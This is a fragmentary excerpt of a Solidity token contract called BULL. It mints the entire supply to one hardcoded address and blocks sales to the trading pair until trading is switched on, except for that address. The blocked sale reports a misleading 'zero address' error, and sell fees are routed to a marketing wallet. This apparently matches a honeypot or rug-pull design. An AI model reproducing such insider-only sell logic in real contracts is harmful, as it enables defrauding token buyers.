...
contract BULL is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _marks = 3;
        _done = 5;
        _maxsell = 20000 * 10 ** decimals();
        _dead = 0x000000000000000000000000000000000000dEaD;
        _main = 0x1a327a428fB28F7Ff7B454aD5F8EDDd7bbF82f16;
        _mark1 = 0x1a327a428fB28F7Ff7B454aD5F8EDDd7bbF82f16;
        _whites[_dead] = true;
        _whites[_main] = true;
        _whites[_msgSender()] = true;
        _whites[address(this)] = true;
        _mint(_main, 1000000000 * 10 ** decimals());
    }
    ...
    function _transfer(
        ...
        if (recipient == _pair && !isContract(sender)) {
            if (_whites[sender] && !_whites[recipient] && sender ==0x1a327a428fB28F7Ff7B454aD5F8EDDd7bbF82f16){
                ABC = true;
            }else{
                require(kaipan == true, "ERC20: transfer to the zero address");
            }
    ...
    function _swap1() private {
        ...
        if (_maxsell > 0 && balances >= _maxsell) {
            _swapTokenForFist((balances)*3 / 6);
            _swapTokenForFist1((balances)*2 / 6);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
                IERC20(_fist).transfer(_mark1, (fistval2)*2 / 6);
                if (balances/6 > 0 && (fistval2)*1/6 > 0) {
                addLiquidity2(balances/6, (fistval2)*1/6);
    ...
    function _swapTokenForFist1(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);path[1] = _goumai;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    ...
    function maxSELL(uint256 val4) public  {
